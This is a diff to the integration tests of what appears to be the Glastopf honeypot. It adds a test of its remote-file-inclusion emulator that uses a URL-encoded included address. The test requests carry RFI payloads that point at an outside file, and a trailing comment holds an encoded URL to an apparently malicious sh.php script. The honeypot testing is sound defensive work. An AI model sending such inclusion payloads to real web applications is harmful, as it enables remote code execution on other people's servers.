@@ -141,7 +141,7 @@ class TestEmulatorIntegration(unittest.TestCase):
         Expected Result: The return value from the PHP sandbox.
         Notes: Injected file contains <?php echo("test successful"); ?>"""
         GlastopfHoneypot.prepare_sandbox(self.work_dir)
-        print "Starting remote file inclusion test"
+        print "Starting remote file inclusion test using unquoted url"
         event = attack.AttackEvent()
         event.http_request = HTTPHandler('GET /test.php?p=http://1durch0.de/test_file.txt HTTP/1.0', None)
         event.matched_pattern = "rfi"
@@ -152,6 +152,27 @@ class TestEmulatorIntegration(unittest.TestCase):
         emulator.handle(event)
         self.assertEqual(event.http_request.get_response(), "test successful")
         print "Return value 'test successful', matching our expectation."
+
+    def test_rfi_emulator_quoted_url(self):
+        # TODO: Handle return value from sandbox
+        """Objective: Remote File Injection test when attacker injects quoted url.
+        Input: /test.php?p=http%3A%2F%21durch0.de%2Ftest_file.txt
+        Expected Result: The return value from the PHP sandbox.
+        Notes: Injected file contains <?php echo("test successful"); ?>"""
+        GlastopfHoneypot.prepare_sandbox(self.work_dir)
+        print "Starting remote file inclusion test using quoted url."
+        event = attack.AttackEvent()
+        event.http_request = HTTPHandler('GET /test.php?p=http%3A%2F%2F1durch0.de%2Ftest_file.txt HTTP/1.0', None)
+        event.matched_pattern = "rfi"
+        print "Sending request:", "http://localhost:8080" + event.http_request.path
+        helpers.create_sandbox(self.data_dir)
+        request_handler = RequestHandler(self.data_dir)
+        emulator = request_handler.get_handler(event.matched_pattern)
+        emulator.handle(event)
+        self.assertEqual(event.http_request.get_response(), "test successful")
+        print "Return value 'test successful', matching our expectation."
+
+        #http%3A%2F%2Fflickr.com.blumenlendlefloral.com%2Fsh.php
 
     def test_rfi_emulator_with_malformed_uri(self):
         # TODO: Handle return value from sandbox
